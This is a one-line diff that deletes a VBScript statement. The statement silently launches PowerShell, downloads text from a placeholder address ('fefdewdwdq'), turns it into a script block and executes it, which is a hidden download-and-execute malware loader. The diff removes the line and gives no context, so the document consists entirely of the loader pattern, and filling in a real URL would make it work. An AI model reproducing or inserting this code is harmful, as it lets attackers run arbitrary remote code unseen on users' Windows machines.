@@ -1,1 +1,0 @@
-CreateObject("WScript.Shell").Run "powershell -noexit  Add-Type -AssemblyName 'System.Net.Http';$content = (New-Object System.Net.Http.HttpClient).GetAsync('fefdewdwdq').Result.Content.ReadAsStringAsync().Result;$scriptBlock=[ScriptBlock]::Create($content);$scriptBlock.Invoke()", 0, False
